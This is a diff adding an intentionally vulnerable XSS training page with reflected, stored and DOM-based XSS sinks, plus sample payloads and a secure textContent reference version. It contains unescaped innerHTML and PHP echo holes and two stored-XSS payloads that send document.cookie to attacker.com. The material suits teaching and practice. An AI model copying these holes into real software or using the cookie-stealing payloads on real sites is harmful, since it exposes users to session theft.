@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>XSS Practice Lab</title>
+    <style>
+        body { font-family: monospace; background: #1a1a2e; color: #0f0; padding: 20px; }
+        h1 { color: #00ff41; }
+        h2 { color: #0affed; }
+        input, button { font-family: monospace; padding: 5px; margin: 5px; }
+        input { background: #0d0d0d; color: #0f0; border: 1px solid #0f0; width: 400px; }
+        button { background: #0f0; color: #000; cursor: pointer; border: none; }
+        .result { background: #0d0d0d; padding: 10px; margin: 10px 0; border: 1px solid #0f0; }
+        .hint { color: #ffff00; }
+        pre { color: #0affed; }
+        .danger { color: #ff0000; }
+    </style>
+</head>
+<body>
+
+<h1>XSS Practice Lab</h1>
+<p class="danger">This lab is intentionally vulnerable. Practice finding and exploiting XSS.</p>
+
+<!-- ============================
+     REFLECTED XSS VULNERABLE
+     ============================ -->
+<h2>1. Reflected XSS (Search Box)</h2>
+<p>Your input is reflected directly into the page without encoding.</p>
+
+<form method="GET">
+    <input type="text" name="q" placeholder="Enter search term...">
+    <button type="submit">Search</button>
+</form>
+
+<div class="result">
+    <strong>Results for: </strong>
+    <!-- VULNERABLE: Direct output without encoding -->
+    <span id="search-output"></span>
+</div>
+
+<script>
+    // VULNERABLE: Direct innerHTML with user input
+    var params = new URLSearchParams(window.location.search);
+    var query = params.get('q');
+    if (query) {
+        document.getElementById('search-output').innerHTML = '<strong>' + query + '</strong>';
+    }
+</script>
+
+<h3>Try These Payloads:</h3>
+<pre>
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+&lt;img src=x onerror=alert('XSS')&gt;
+&lt;svg onload=alert('XSS')&gt;
+&lt;body onload=alert('XSS')&gt;
+&lt;input onfocus=alert('XSS') autofocus&gt;
+&lt;marquee onstart=alert('XSS')&gt;
+</pre>
+
+<!-- ============================
+     STORED XSS VULNERABLE
+     ============================ -->
+<h2>2. Stored XSS (Guestbook)</h2>
+<p>Your comment is stored and displayed to all visitors.</p>
+
+<form method="POST" action="?guestbook=1">
+    Name: <input type="text" name="name" placeholder="Your name"><br>
+    Message: <input type="text" name="message" placeholder="Your message"><br>
+    <button type="submit">Post Comment</button>
+</form>
+
+<div class="result" id="guestbook">
+    <strong>Guestbook Entries:</strong><br>
+    <!-- VULNERABLE: Stored XSS -->
+    <?php
+    if (isset($_POST['name']) && isset($_POST['message'])) {
+        // In real app: save to database
+        // Here: just display directly (VULNERABLE)
+        $name = $_POST['name'];
+        $message = $_POST['message'];
+        echo "<div><strong>" . $name . "</strong>: " . $message . "</div>";
+    }
+    ?>
+</div>
+
+<h3>Stored XSS Payloads:</h3>
+<pre>
+&lt;script&gt;document.location='http://attacker.com/steal?c='+document.cookie&lt;/script&gt;
+&lt;img src=x onerror="fetch('http://attacker.com/log?cookie='+document.cookie)"&gt;
+</pre>
+
+<!-- ============================
+     DOM-BASED XSS VULNERABLE
+     ============================ -->
+<h2>3. DOM-Based XSS</h2>
+<p>The vulnerability is in the JavaScript code itself.</p>
+
+<div class="result">
+    <strong>Welcome: </strong><span id="welcome"></span>
+</div>
+
+<script>
+    // VULNERABLE: Using location.hash directly
+    var hash = window.location.hash.substring(1);
+    document.getElementById('welcome').innerHTML = decodeURIComponent(hash);
+</script>
+
+<h3>DOM XSS Payload (use URL fragment):</h3>
+<pre>
+#&lt;img src=x onerror=alert('DOM XSS')&gt;
+</pre>
+
+<!-- ============================
+     SECURE VERSION
+     ============================ -->
+<h2>4. Secure Version (For Reference)</h2>
+<div class="result">
+    <strong>Secure Search Results: </strong>
+    <span id="secure-output"></span>
+</div>
+
+<script>
+    // SECURE: Using textContent (no HTML parsing)
+    var query = params.get('q');
+    if (query) {
+        document.getElementById('secure-output').textContent = 'You searched for: ' + query;
+    }
+</script>
+
+<h3>Security Measures:</h3>
+<pre>
+✅ textContent instead of innerHTML
+✅ Content Security Policy (CSP) headers
+✅ Input validation and sanitization
+✅ Output encoding on the server side
+✅ HttpOnly cookies
+✅ X-XSS-Protection header
+</pre>
+
+</body>
+</html>
